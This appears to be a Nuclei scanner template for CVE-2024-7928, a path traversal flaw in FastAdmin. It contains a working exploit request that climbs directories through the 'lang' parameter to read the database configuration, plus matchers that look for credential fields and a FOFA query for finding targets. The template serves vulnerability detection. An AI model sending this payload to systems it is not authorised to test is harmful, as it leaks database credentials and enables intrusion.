id: CVE-2024-7928

info:
  name: FastAdmin < V1.3.4.20220530 - Path Traversal
  author: s4e-io,Hel10-Web
  severity: medium
  description: |
    A vulnerability, which was classified as problematic, has been found in FastAdmin up to 1.3.3.20220121. Affected by this issue is some unknown functionality of the file /index/ajax/lang. The manipulation of the argument lang leads to path traversal. The attack may be launched remotely. The exploit has been disclosed to the public and may be used. Upgrading to version 1.3.4.20220530 is able to address this issue. It is recommended to upgrade the affected component.
  impact: |
    Authenticated attackers can exploit path traversal to read sensitive files including database configuration files containing credentials, usernames, passwords, and other critical system information.
  remediation: |
    Update FastAdmin to version 1.3.4.20220530 or later to address the path traversal vulnerability in the lang parameter.
  reference:
    - https://wiki.shikangsi.com/post/share/da0292b8-0f92-4e6e-bdb7-73f47b901acd
    - https://github.com/bigb0x/CVE-2024-7928
    - https://nvd.nist.gov/vuln/detail/CVE-2024-7928
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N
    cvss-score: 4.3
    cve-id: CVE-2024-7928
    cwe-id: CWE-22
    epss-score: 0.92925
    epss-percentile: 0.99765
    cpe: cpe:2.3:a:fastadmin:fastadmin:1.3.3.20220121:*:*:*:*:*:*:*
  metadata:
    max-request: 1
    vendor: fastadmin
    product: fastadmin
    fofa-query: icon_hash="-1036943727"
  tags: cve,cve2024,fastadmin,lfi,vkev,vuln

http:
  - raw:
      - |
        GET /index/ajax/lang?lang=../../application/database HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - 'jsonpReturn('
          - '"password":'
          - '"username":'
          - '"database":'
        condition: and

      - type: word
        part: content_type
        words:
          - 'application/javascript'

      - type: status
        status:
          - 200
# digest: 4a0a00473045022068184f0794157154d67813f615b1c8adbfe87cf6ba33ff99c1026b439b5922120221009275c8c567a9d8fcc7768944f71c8e2360f253820e7a20f10895454e76a9800a:922c64590222798bb761d5b6d8e72950